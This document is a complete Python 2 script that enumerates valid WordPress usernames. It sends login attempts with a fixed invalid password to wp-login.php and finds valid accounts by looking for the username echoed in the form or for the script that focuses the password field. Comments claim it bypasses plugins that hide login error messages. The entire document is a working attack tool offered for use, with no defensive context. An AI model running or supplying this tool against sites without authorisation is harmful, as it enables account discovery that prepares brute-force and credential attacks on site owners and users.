#Python script for user enumeration from WordPress login page
#It works even if plugins like "Unified Login Error Messages" is installed

try:
	import requests
	import sys
	import ssl
except Exception,e:
	print "[!] Error: "+str(e)
	print "[*] Make sure you have the following Python modules installed:\n\trequests, sys, ssl"
	exit(0)

if len(sys.argv)!=3:
	print "\nUsage: " + sys.argv[0] + " <wordpress_target> <username_file>"
	print "Example: " + sys.argv[0] + " http://192.168.1.1/wordpress users.txt"
	print "\nTechnique Reference:\nT1 = Check for 'value=\"<username>\"'\nT2 = Check for \"document.getElementById('user_pass')\"\n"
	sys.exit(0)

target = sys.argv[1]
user_file = sys.argv[2]

f = open(user_file, "r")
user_list = f.readlines()

#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080",}
cookies = dict(wordpress_test_cookie='WP Cookie Check')

if hasattr(ssl, '_create_unverified_context'):
	ssl._create_default_https_context = ssl._create_unverified_context

try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

for user in user_list:
	try:
		user = (user.replace("\r", "")).replace("\n", "")
		post_data = {"log":user, "pwd":"AnyInvalidPass", "wp-submit":"Log In", "redirect_to":target+"/wp-admin/", "testcookie":"1"}
		#r = requests.post(target+"/wp-login.php", data=post_data, proxies=proxies, cookies=cookies, verify=False)
		r = requests.post(target+"/wp-login.php", data=post_data, cookies=cookies, verify=False)
		sc = r.text
		#print sc
		check1 = 'value="'+user+'"'
		check2 = "document.getElementById('user_pass')";
		#print check1
		#print check2
		#print int(sc.find(check1))
		if int(sc.find(check1)) > -1:
			print "[T1] Valid user: "+user
		else:
			if int(sc.find(check2)) > -1:
				print "[T2] Valid user: "+user
	except:
		print "Exception occurred"
